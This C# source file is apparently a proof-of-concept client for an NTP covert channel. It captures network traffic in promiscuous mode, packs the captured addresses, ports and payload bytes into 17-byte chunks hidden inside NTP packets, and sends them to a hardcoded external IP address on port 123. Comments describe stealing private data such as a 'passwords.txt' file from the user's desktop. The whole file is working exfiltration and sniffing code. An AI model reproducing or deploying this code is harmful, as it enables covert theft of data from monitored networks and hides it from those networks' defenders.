using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using NtpTun_PoC;
using SharpPcap;
using PacketDotNet;
namespace NtpTun_Client
{
    class Program
    {
        static Dictionary<byte, byte[]> packets = new Dictionary<byte, byte[]>();
        static void Main(string[] args)
        { int k=0;
            CaptureDeviceList deviceList = CaptureDeviceList.Instance;
            foreach (ICaptureDevice dev in deviceList)
            {
                Console.WriteLine("{0}\n", dev.ToString());
            }
            ICaptureDevice device = deviceList[3];
            device.Open(DeviceMode.Promiscuous, 1000);

            Console.WriteLine();
            Console.WriteLine("-- Listening on {0}...", device.Description);

            Packet packet = null;
            while (true)
            {
                RawCapture raw = device.GetNextPacket();
                while (raw == null) raw = device.GetNextPacket();
                packet = Packet.ParsePacket(raw.LinkLayerType, raw.Data);
                var tcpPacket = TcpPacket.GetEncapsulated(packet);
                var ipPacket = IpPacket.GetEncapsulated(packet);
                if (tcpPacket != null && ipPacket != null)
                {
                    DateTime time = raw.Timeval.Date;
                    int len = raw.Data.Length;
                    Console.WriteLine("{0}:{1}:{2},{3} Len={4}",
                                       time.Hour, time.Minute, time.Second,
                                       time.Millisecond, len);
                    //Console.WriteLine(e.Packet.ToString());
                    // IP адрес отправителя
                    var srcIp = ipPacket.SourceAddress.ToString();
                    //Console.WriteLine("srcIp="+ srcIp);
                    // IP адрес получателя
                    var dstIp = ipPacket.DestinationAddress.ToString();
                    //Console.WriteLine("dstIp=" + dstIp);
                    // порт отправителя
                    var srcPort = tcpPacket.SourcePort.ToString();
                    //Console.WriteLine("srcPort=" + srcPort);
                    // порт получателя
                    var dstPort = tcpPacket.DestinationPort.ToString();
                    //Console.WriteLine("dstPost=" + dstPort);
                    // данные пакета
                    var data = BitConverter.ToString(raw.Data);
                    //Console.WriteLine("data=" + data);
                    string path = srcIp.ToString() + " " + dstIp.ToString() + " " + srcPort.ToString() + " " + dstPort.ToString() + " " + data.ToString() + " ";
                    Console.WriteLine(path);
                k++;



                //Get some private data
                //For example, contents of `passwords.txt` on user's desktop
                 path += "TRANSFER COMPLETE"; //Add 17 bytes more to guaranteely send 2 or more packets
                                                 //Now split by 17 bytes each
                int ctr = 0;
                List<byte[]> pcs = new List<byte[]>();
                int BYTE_CNT = 17;
                byte[] current = new byte[BYTE_CNT];
                foreach (var cb in Encoding.ASCII.GetBytes(path))
                {
                    if (ctr == BYTE_CNT)
                    {
                        //BYTE_CNT bytes added, start new iteration
                        byte[] bf = new byte[BYTE_CNT];
                        current.CopyTo(bf, 0);
                        pcs.Add(bf);
                        String deb = Encoding.ASCII.GetString(bf);
                        ctr = 0;
                        for (int i = 0; i < BYTE_CNT; i++) current[i] = 0x0;
                    }
                    if (cb == '\n' || cb == '\r')
                    {
                        current[ctr] = Encoding.ASCII.GetBytes("_")[0];
                    }
                    else current[ctr] = cb;
                    ctr++;
                }
                //OK split
                Console.WriteLine($"OK split into {pcs.Count} parts");
                //Now send
                UDPSocket socket = new UDPSocket();
                socket.Client("88.151.112.223", 123);
                byte pkt_id = 0;
                int total_sent = 0;
                Stopwatch sw = new Stopwatch();
                sw.Start();
                    foreach (var ci in pcs)
                    {
                        NtpPacket ntp = new NtpPacket();
                        ntp = ntp.EmbedDataToPacketC(ci);
                        byte[] result = ntp.BuildPacket();
                        result[5] = pkt_id;
                        if (k==0) packets.Add(pkt_id, result);
                        Console.WriteLine($"Sending: {Encoding.ASCII.GetString(result)}");
                        socket.Send(result);
                        Thread.Sleep(1);
                        total_sent += result.Length;
                        pkt_id++;
                    }
                sw.Stop();

                Console.WriteLine($"Sent {pkt_id} packets in {sw.ElapsedMilliseconds} ms. Avg speed: {total_sent / ((double)((double)sw.ElapsedMilliseconds / (double)1000))} B/s");

                Console.WriteLine("Package was sent");
                //Console.ReadKey(true);
                }
            }
        }
        /*private static void ResendMissingPacket(byte packet_id)
        {

        }*/
    }
    
}
